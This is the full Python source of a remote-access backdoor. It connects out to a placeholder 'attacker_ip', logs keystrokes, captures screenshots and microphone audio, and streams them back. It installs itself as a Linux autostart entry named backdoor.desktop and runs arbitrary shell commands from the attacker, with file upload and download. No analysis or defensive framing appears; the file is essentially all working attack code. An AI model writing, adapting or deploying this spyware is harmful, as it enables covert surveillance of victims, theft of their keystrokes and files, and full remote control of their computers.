import socket
import subprocess
import threading
import time
import mss
import base64
import os
import pyaudio
import wave
from pynput import keyboard

HOST = 'attacker_ip'  # Replace with the attacker's IP address
PORT = 12345  # Choose a port number
INTERVAL = 10  # Keylogger interval in seconds
SCREENSHOT_INTERVAL = 60  # Screenshot interval in seconds
AUDIO_INTERVAL = 60  # Audio recording interval in seconds

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))

keys = []
screenshot_count = 0
audio_count = 0

def keylogger():
    def on_press(key):
        try:
            keys.append(key.char)
        except AttributeError:
            keys.append(str(key))

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def screenshot():
    global screenshot_count
    with mss.mss() as sct:
        while True:
            screenshot = sct.grab(sct.monitors[1])
            screenshot_bytes = base64.b64encode(mss.tools.to_png(screenshot.rgb, screenshot.size))
            client.send(f"screenshot_{screenshot_count} {screenshot_bytes.decode('utf-8')}".encode('utf-8'))
            screenshot_count += 1
            time.sleep(SCREENSHOT_INTERVAL)

def audio_capture():
    global audio_count
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 16000  # Lowered sample rate for reduced file size
    RECORD_SECONDS = 10

    p = pyaudio.PyAudio()

    while True:
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = []

        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()

        wf = wave.open(f"audio_{audio_count}.wav", 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()

        with open(f"audio_{audio_count}.wav", 'rb') as file:
            audio_data = base64.b64encode(file.read())
            client.send(f"audio_{audio_count} {audio_data.decode('utf-8')}".encode('utf-8'))

        audio_count += 1
        time.sleep(AUDIO_INTERVAL)

def persistence():
    try:
        os.system('cp /path/to/backdoor.py ~/.config/autostart/backdoor.desktop')
        with open('~/.config/autostart/backdoor.desktop', 'w') as f:
            f.write('[Desktop Entry]\n')
            f.write('Type=Application\n')
            f.write('Exec=python3 /path/to/backdoor.py\n')
            f.write('Hidden=false\n')
            f.write('NoDisplay=false\n')
            f.write('X-GNOME-Autostart-enabled=true\n')
    except Exception as e:
        print(f"Error setting persistence: {str(e)}")

def handle_connection():
    global keys
    while True:
        try:
            command = client.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                break
            elif command.lower() == 'keys':
                client.send(" ".join(keys).encode('utf-8'))
                keys = []
            elif command.lower().startswith('upload'):
                file_data = client.recv(1024).decode('utf-8')
                file_path = command.split()[1]
                with open(file_path, 'wb') as file:
                    file.write(base64.b64decode(file_data))
            elif command.lower().startswith('download'):
                file_path = command.split()[1]
                with open(file_path, 'rb') as file:
                    file_data = base64.b64encode(file.read())
                    client.send(file_data)
            else:
                output = subprocess.check_output(command, shell=True).decode('utf-8')
                client.send(output.encode('utf-8'))
        except Exception as e:
            print(f"Error handling connection: {str(e)}")

# Set persistence
persistence()

# Start the keylogger thread
keylogger_thread = threading.Thread(target=keylogger, daemon=True)
keylogger_thread.start()

# Start the screenshot thread
screenshot_thread = threading.Thread(target=screenshot, daemon=True)
screenshot_thread.start()

# Start the audio capture thread
audio_thread = threading.Thread(target=audio_capture, daemon=True)
audio_thread.start()

# Handle incoming connections
handle_connection()

# Close the client connection
client.close()

